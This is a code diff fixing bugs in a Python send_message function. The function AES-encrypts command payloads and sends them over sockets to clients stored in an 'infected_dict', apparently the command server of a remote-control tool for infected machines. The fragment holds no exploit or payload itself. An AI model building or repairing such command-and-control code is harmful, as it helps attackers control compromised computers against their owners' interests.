@@ -224,19 +224,19 @@ def send_message(message, infected_dict):
         # to the other clients.
         for name, socket_client in infected_dict.items():
             try:
-                final_mess = aes_encrypt(infected_dict[socket_client][2], final_mess)
+                encrypted_mess = aes_encrypt(socket_client[2], final_mess)
                 print("mess encrypted")
-                socket_client.send(header + final_mess.encode("utf-8"))
-            except Exception:
+                socket_client[0].send(header + encrypted_mess.encode("utf-8"))
+            except Exception as e:
                 print("pb line 231 !")
-                print(Exception)
+                print(e)
     else:
         if target in infected_dict:
             # Send the length header followed by the exact command payload
             # expected by the client's receive loop.
             try:
-                final_mess = aes_encrypt(infected_dict[target][2], final_mess)
-                infected_dict[target][0].send(header + final_mess.encode("utf-8"))
+                encrypted_mess = aes_encrypt(infected_dict[target][2], final_mess)
+                infected_dict[target][0].send(header + encrypted_mess.encode("utf-8"))
             except Exception as e:
                 print(f"[!] Erreur d'envoi à {target}")
         else:
